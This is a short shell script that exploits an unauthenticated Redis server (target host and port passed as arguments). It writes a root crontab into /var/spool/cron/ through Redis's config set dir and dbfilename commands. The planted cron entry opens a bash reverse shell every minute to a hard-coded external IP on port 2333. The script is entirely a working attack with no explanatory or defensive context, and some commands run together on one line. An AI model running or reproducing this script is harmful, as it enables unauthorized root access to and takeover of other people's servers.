echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/101.200.144.143/2333 0>&1\n\n"|redis-cli -h $1 -p $2 -x set 1 
redis-cli -h $1 -p $2 config set dir /var/spool/cron/ redis-cli -h $1 -p $2 config set dbfilename root 
redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit